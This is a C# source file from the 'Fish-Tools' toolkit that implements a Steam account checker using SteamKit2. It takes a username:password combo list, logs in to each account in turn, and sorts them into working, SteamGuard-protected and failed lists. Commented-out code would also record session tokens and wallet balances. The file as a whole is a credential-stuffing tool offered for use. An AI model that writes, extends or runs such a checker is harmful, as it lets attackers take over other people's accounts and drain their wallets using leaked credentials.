/*
------------------------------------------------------------
Made By notfishvr
github: https://github.com/official-notfishvr/Fish-Tools
------------------------------------------------------------
*/
using SteamKit2;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers.Steam
{
    class SteamAccountChecker
    {
        private static int firstUsername = 0; // Do not change - gets >username< :password
        private static int firstPassword = 1; // Do not change - gets username: >password<

        delegate void SetVisibilityCallback(bool isVisible);

        public static void CheckAutomatically()
        {
            try
            {
                if (Settings.mw == null || Settings.mw.textBoxFile == null)
                {
                    MessageBox.Show("Main window or textbox not initialized.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                SteamAccountHelper.filePath = Settings.mw.textBoxFile.Text;

                if (string.IsNullOrEmpty(SteamAccountHelper.fileContent))
                {
                    MessageBox.Show("File content is empty or not loaded.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string[] splitUsersPasswords = SteamAccountHelper.fileContent.Split(new[] { ':', '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

                while (SteamAccountHelper.currentValue < splitUsersPasswords.Length / 2)
                {
                    SteamAccountHelper.remainingAccounts = SteamAccountHelper.maximumData;
                    UIHelper.UpdateRemainingLabel(SteamAccountHelper.remainingAccounts.ToString());

                    SteamAccountHelper.userName = splitUsersPasswords[firstUsername];
                    SteamAccountHelper.password = splitUsersPasswords[firstPassword];

                    SteamAccountHelper.steamClient = new SteamClient();
                    SteamAccountHelper.manager = new CallbackManager(SteamAccountHelper.steamClient);
                    SteamAccountHelper.steamUser = SteamAccountHelper.steamClient.GetHandler<SteamUser>();

                    SteamAccountHelper.manager.Subscribe<SteamClient.ConnectedCallback>(SteamAccountHelper.OnConnected);
                    SteamAccountHelper.manager.Subscribe<SteamClient.DisconnectedCallback>(SteamAccountHelper.OnDisconnected);
                    SteamAccountHelper.manager.Subscribe<SteamUser.SessionTokenCallback>(SteamAccountHelper.OnSessionToken);
                    SteamAccountHelper.manager.Subscribe<SteamUser.WalletInfoCallback>(SteamAccountHelper.OnWalletInfo);
                    SteamAccountHelper.manager.Subscribe<SteamUser.LoggedOnCallback>(SteamAccountHelper.OnLoggedOn);
                    SteamAccountHelper.manager.Subscribe<SteamUser.LoggedOffCallback>(SteamAccountHelper.OnLoggedOff);

                    SteamAccountHelper.isRunning = true;
                    SteamAccountHelper.steamClient.Connect();

                    while (SteamAccountHelper.isRunning)
                    {
                        SteamAccountHelper.manager.RunWaitCallbacks(TimeSpan.FromSeconds(1));
                    }

                    firstUsername += 2;
                    firstPassword += 2;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed. Error: {ex.Message}", "Internal Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public static void CleanupUpdate()
        {
            SteamAccountHelper.userName = string.Empty;
            SteamAccountHelper.password = string.Empty;
            SteamAccountHelper.localToExport = string.Empty;
            SteamAccountHelper.checkedAccounts = 0;
            SteamAccountHelper.remainingAccounts = 0;
            SteamAccountHelper.maximumData = 0;
            SteamAccountHelper.currentValue = 0;
            SteamAccountHelper.loggableAccounts = 0;
            SteamAccountHelper.steamGuardProtectedAccounts = 0;
            SteamAccountHelper.badAccounts = 0;

            UIHelper.UpdateLoggableLabel(SteamAccountHelper.loggableAccounts.ToString());
            UIHelper.UpdateSGProjectedLabel(SteamAccountHelper.steamGuardProtectedAccounts.ToString());
            UIHelper.UpdateBadLabel(SteamAccountHelper.badAccounts.ToString());

            firstUsername = 0; // Do not change
            firstPassword = 1; // Do not change
        }
    }
    class SteamAccountHelper
    {
        public static readonly List<string> GoodAccountsList = new List<string>();
        public static readonly List<string> sGProtectedAccountsList = new List<string>();
        public static readonly List<string> badAccountsList = new List<string>();

        public static SteamClient steamClient;
        public static CallbackManager manager;
        public static SteamUser steamUser;

        public static string userName, password;

        public static string fileContent = string.Empty;
        public static string filePath = string.Empty;
        public static string localToExport = string.Empty;

        public static int checkedAccounts = 0;
        public static int remainingAccounts = 0;
        public static int maximumData = 0;
        public static int currentValue = 0;
        public static int loggableAccounts = 0;
        public static int steamGuardProtectedAccounts = 0;
        public static int badAccounts = 0;

        public static bool isRunning;

        public static void OnConnected(SteamClient.ConnectedCallback callback)
        {
            LogHelper.Log($"Logging in '{userName}' ('{password}')");
            if (!(callback is null)) steamUser.LogOn(new SteamUser.LogOnDetails { Username = userName, Password = password, });
            else MessageBox.Show($"Callback is null", "Internal Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        public static void OnDisconnected(SteamClient.DisconnectedCallback callback)
        {
            if (!(callback is null)) isRunning = false;
            else MessageBox.Show($"Callback is null", "Internal Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
        public static void OnLoggedOn(SteamUser.LoggedOnCallback callback)
        {
            if (callback.Result != EResult.OK)
            {
                if (callback.Result == EResult.AccountLogonDenied)
                {
                    steamGuardProtectedAccounts += 1;
                    sGProtectedAccountsList.Add($"{userName}:{password}\n");
                    steamUser.LogOff();
                    LogHelper.ListAccountOnGUI(LogHelper.Result.SteamGuardProtected, userName, password, "SteamGuard protected");
                    UIHelper.UpdateSGProjectedLabel(steamGuardProtectedAccounts.ToString());
                }
                else
                {
                    badAccounts += 1;
                    badAccountsList.Add($"{userName}:{password}\n");
                    steamUser.LogOff();
                    LogHelper.ListAccountOnGUI(LogHelper.Result.Fail, userName, password, $"{callback.ExtendedResult}");
                    UIHelper.UpdateBadLabel(badAccounts.ToString());
                }
            }
            else
            {
                //string filePath = Path.Combine("C:\\Users\\notfishvr\\source\\repos\\Fish Account Checker\\Fish Account Checker\\bin\\", "a.txt");
                //using (StreamWriter writer = new StreamWriter(filePath, true)) { writer.WriteLine($"Username: {SteamAccountHelper.userName}, a: {a}, a2: {a2}"); }

                loggableAccounts += 1;
                GoodAccountsList.Add($"{userName}:{password}\n");
                steamUser.LogOff();
                LogHelper.ListAccountOnGUI(LogHelper.Result.Success, userName, password, string.Empty);
                UIHelper.UpdateLoggableLabel(loggableAccounts.ToString());
            }

            remainingAccounts -= 1;
            checkedAccounts++;
            UIHelper.UpdateRemainingLabel(remainingAccounts.ToString());
            UIHelper.UpdateCheckedLabel(checkedAccounts.ToString());
        }
        public static void OnSessionToken(SteamUser.SessionTokenCallback callback)
        {
            //string filePath = Path.Combine("C:\\Users\\notfishvr\\source\\repos\\Fish Account Checker\\Fish Account Checker\\bin\\", "SessionToken.txt");
            //using (StreamWriter writer = new StreamWriter(filePath, true)) { writer.WriteLine($"Login: {userName}:{password}, Session Token: {callback.SessionToken}"); }
        }
        public static void OnWalletInfo(SteamUser.WalletInfoCallback callback)
        {
            //string filePath = Path.Combine("C:\\Users\\notfishvr\\source\\repos\\Fish Account Checker\\Fish Account Checker\\bin\\", "WalletInfo.txt");
            //using (StreamWriter writer = new StreamWriter(filePath, true)) { writer.WriteLine($"Login: {userName}:{password}, Has Wallet: {callback.HasWallet}, Balance: {callback.Balance}, Currency: {callback.Currency}"); }
        }
        public static void OnLoggedOff(SteamUser.LoggedOffCallback callback) => LogHelper.Log($"➜ Closing: {callback.Result}");
    }
}
